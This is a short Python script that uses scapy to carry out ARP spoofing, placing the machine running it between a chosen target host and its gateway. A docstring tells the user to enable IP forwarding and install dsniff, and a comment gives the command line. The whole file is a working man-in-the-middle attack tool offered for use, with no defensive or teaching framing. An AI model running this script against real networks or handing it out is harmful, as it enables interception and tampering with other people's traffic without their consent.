"""
IP forwarding must be enabled
     Use echo 1 > /proc/sys/net/ipv4/ip_forward
Install dsniff before continuing
"""
from scapy.all import *
import sys

def spoof_arp(target_ip, target_mac, gateway_ip):
    spoofed_packet = ARP(op="is-at", hwsrc=get_if_hwaddr(conf.iface), psrc=gateway_ip, hwdst=target_mac, pdst=target_ip)
    send(spoofed_packet, verbose=False)

def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac):
    restore_packet = ARP(op="is-at", hwsrc=gateway_mac, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip)
    send(restore_packet, verbose=False)

def main():
    if len(sys.argv) != 3:
        print("Usage: python arp_spoof.py <target_ip> <gateway_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]

    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)

    try:
        print("Spoofing in progress. Press Ctrl+C to abort.")
        while True:
            spoof_arp(target_ip, target_mac, gateway_ip)
            spoof_arp(gateway_ip, gateway_mac, target_ip)
    except KeyboardInterrupt:
        print("Restoring ARP Tables.")
        restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)
        restore_arp(gateway_ip, gateway_mac, target_ip, target_mac)
        print("ARP tables restored. Exiting.")
        sys.exit(0)

if __name__ == "__main__":
    main()
#run sudo arpspoof.py [target ip address] [default gateway]
